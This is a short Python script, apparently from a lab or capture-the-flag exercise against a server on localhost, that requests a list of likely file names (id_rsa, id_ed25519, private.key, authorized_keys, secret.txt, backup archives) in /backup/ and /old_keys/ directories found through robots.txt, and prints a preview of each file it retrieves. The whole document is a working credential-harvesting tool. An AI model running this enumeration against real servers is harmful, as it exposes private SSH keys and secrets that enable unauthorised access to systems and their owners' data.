import urllib.request
import urllib.error
import socket

# The new directories we discovered in robots.txt
base_dirs = [
    "http://localhost:8000/old_keys/",
    "http://localhost:8000/backup/"
]

# The most common names for SSH keys and backups
files_to_test = [
    "",  # Tests if directory listing itself is enabled (Index of /)
    "id_rsa", "id_rsa.txt", "id_rsa_key", "id_rsa.bak", "id_rsa.old", 
    "id_ed25519", "private.key", "private_key.txt", "key.txt", "ssh_key", 
    "vagrant_key", "vagrant", "authorized_keys", "secret.txt",
    "backup.zip", "backup.tar.gz"
]

print("[*] Starting targeted hunt in /backup/ and /old_keys/ ...")

for base in base_dirs:
    for file in files_to_test:
        url = base + file
        try:
            req = urllib.request.Request(url)
            with urllib.request.urlopen(req, timeout=2) as response:
                if response.status == 200:
                    print(f"\n[+] SUCCESS! Found something at: {url}")
                    
                    try:
                        content = response.read(250).decode('utf-8', errors='ignore')
                        print(f"--- PREVIEW ---\n{content.strip()}\n---------------")
                    except Exception:
                        print("(Binary file or could not read preview - might be a zip archive!)")
                        
        except urllib.error.HTTPError:
            pass  # Ignore 404/403
        except urllib.error.URLError as e:
            print(f"[-] Connection failed: {e.reason}")
            break
        except socket.timeout:
            pass

print("\n[*] Targeted scan complete.")